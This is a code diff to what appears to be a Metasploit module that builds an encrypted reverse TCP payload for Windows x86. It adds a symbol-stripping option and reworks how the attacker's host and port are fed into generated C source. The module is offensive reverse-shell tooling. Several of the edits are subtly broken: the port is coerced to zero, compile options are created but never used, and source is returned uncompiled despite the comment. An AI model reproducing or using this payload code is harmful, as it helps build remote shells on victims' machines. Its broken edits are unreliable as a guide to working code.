@@ -1,8 +1,6 @@
 # -*- coding: binary -*-
 
 require 'msf/core'
-require 'msf/base/sessions/encrypted_shell'
-require 'msf/base/sessions/command_shell_options'
 
 module Msf
 
@@ -11,15 +9,10 @@ module Msf
 # encrypted reverse tcp payload for Windows x86
 #
 ###
-
-#Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')
-
 module Payload::Windows::EncryptedReverseTcp
 
   include Msf::Payload::Windows
   include Msf::Payload::Single
-  include Msf::Session::EncryptedShell
-  include Msf::Session::CommandShellOptions
 
   def initialize(*args)
     super
@@ -28,19 +21,27 @@ module Payload::Windows::EncryptedReverseTcp
     [
       OptBool.new('CallWSAStartup', [ false, 'Adds the function that initializes the Winsock library', true ])
     ])
+
+    register_advanced_options(
+    [
+      OptBool.new('StripSymbols', [ false, 'Payload will be compiled without symbols', true ]),
+    ])
   end
 
   def generate(opts={})
     conf =
     {
       call_wsastartup: datastore['CallWSAStartup'],
-      port:            format_ds_opt(datastore['LPORT']),
-      host:            format_ds_opt(datastore['LHOST'])
+      port:            format_ds_opt(datastore['LPORT']).to_i,
+      host:            format_ds_opt(datastore['LHOST']) || ''
     }
 
     # c source code must be generated first,
     # then compilation and removal of null bytes
-    generate_c_src(conf)
+    src = generate_c_src(conf)
+
+    compile_opts = { strip_symbols: datastore['StripSymbols'] }
+    src
   end
 
   def generate_c_src(conf)
@@ -52,7 +53,7 @@ module Payload::Windows::EncryptedReverseTcp
     end
 
     src << comm_setup
-    src << get_load_library
+    src << get_load_library(conf[:host], conf[:port])
     src << call_init_winsock if conf[:call_wsastartup]
     src << start_comm
   end
@@ -69,7 +70,8 @@ module Payload::Windows::EncryptedReverseTcp
   def format_ds_opt(opt)
     modified = ''
 
-    opt.split('').each { |elem| modified << "\'#{e}\', " }
+    opt = opt.to_s
+    opt.split('').each { |elem| modified << "\'#{elem}\', " }
     modified = "#{modified} 0"
   end
 
@@ -272,7 +274,7 @@ module Payload::Windows::EncryptedReverseTcp
   #
   # ExecutePayload acts as the main function of the c program
   #
-  def get_load_library
+  def get_load_library(host, port)
     %Q^
       void ExecutePayload(VOID)
       {
